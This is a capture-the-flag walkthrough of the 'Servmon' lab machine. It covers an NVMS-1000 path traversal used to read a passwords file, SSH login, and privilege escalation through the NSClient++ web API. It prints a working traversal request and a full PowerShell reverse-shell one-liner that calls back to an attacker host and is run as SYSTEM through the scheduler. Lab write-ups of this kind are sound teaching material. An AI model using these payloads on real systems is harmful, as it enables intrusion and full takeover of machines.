# Servmon Writeup

## Enumeration
```
OS: Windows
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3333/tcp open  dec-notes
5666/tcp open  nrpe
6699/tcp open  napster
8443/tcp open  https-alt
```
Right off the bat 21, 22, and 80 are worth immediate investigation, those are usually the way to get our foot in the door. 
Ports 135, 139, and 445 are standard windows fare. SMB is usually worth checking out immediately, but I don't believe its our way in.
Ports 6699, 3333, 5666 are weird enough to check out later.
## Information Gathering
Port 21 is a great place to start. Nmap shows us that anon logins are allowed, which means we have free reign to poke around
for information.
```
21/tcp   open  ftp            Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
```

Logging in shows a top-level directory called `Users` with two sub-directories, Nadine and Nathan.
Both have a txt file in them. Nathan's says "I left your Passwords.txt file on your Desktop".
So that's something to keep in mind once we have read access to Nathan's files.

Nadine's txt file shows a TODO list:

1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint

So from this we've gathered some important info:
* Nathan has passwords in plaintext on his desktop
* The password for NVMS is not default
* There IS still public access for NVMS (port 80)
* There are some secret files that are supposed to be in sharepoint

Let's move on to poking around the website on port 80.
## Initial Compromise
```
80/tcp   open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
```
Visiting the website shows that it's a login portal for "NVMS-1000"
Looking that up shows it's a monitoring client for video surveillence over IP.
Poking around the page reveals a path traversal (CVE-2019-20085). Combining that with the
knowledge we got from the FTP server, we can view the passwords.txt file on Nathan's desktop:
```
import requests
addr = f'http://10.10.10.184:80'
x = requests.get(f'{addr}/../../../../../../../../../../../../Users/nathan/Desktop/passwords.txt'
print(x.status_code)
>>> 200
```
Success! That nets us some passwords to try against SSH.

I wrote a quick python script to try the passwords and bingo, and just like that we've got shell access and have secured the user flag.
Now, let's do some privilege escalation.
#
# Privilege Escalation and Post-Exploitation
#
Let's revisit nagios, on port 5666. I initially thought that would be our initial compromise, so I looked over some CVEs.
There's quite a few ranging from SQLi to RCE, but what we're focused on is RCE or LPE. 

While I was looking I found an exploit chain written (poorly) in python2. I took the liberty of making it not suck ass 
and updated it to python3. I slightly tweaked it to make it standalone, and used pyinstaller to package it. I used netcat to
set up a listener on the windows box and send the executable from my VM.

After a few unsuccessful tries, I started looking around the files related to NRPE/Nagios when I found the NSClient++ folder in program files. I realized that I had read access to the files, and that the .ini file contained the password. I started looking for ways to use NSClient to elevate to either local admin or NT AUTHORITY/SYSTEM, and found out you can ran scripts in the context of the NSClient service, aka SYSTEM. I also realized, by reading the [NSClient Manual](https://docs.nsclient.org/) that you can issue commands using their API at the `https://localhost:8443/api/v1/` endpoint.

I used a simple reverse shell as a payload by first adding the script:
```
curl -i -k -X PUT -u admin https://localhost:8443/api/v1/scripts/ext/exp.bat --data-binary 'powershell.exe -nop -c "$client = New-Object System.Net.Sockets.TCPClient('xxxx',7777);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
```
and used NSClient's [scheduler](https://docs.nsclient.org/reference/generic/Scheduler/) to execute:
```
curl -i -k -u admin https://localhost:8443/api/v1/scripts/ext/scripts/exp.bat
curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/exp/commands/execute?time=1m
```
After a minute, I got a connection on the netcat listener on my VM. From there, we had permissions to view C:\Administrator\Desktop and get the root flag.
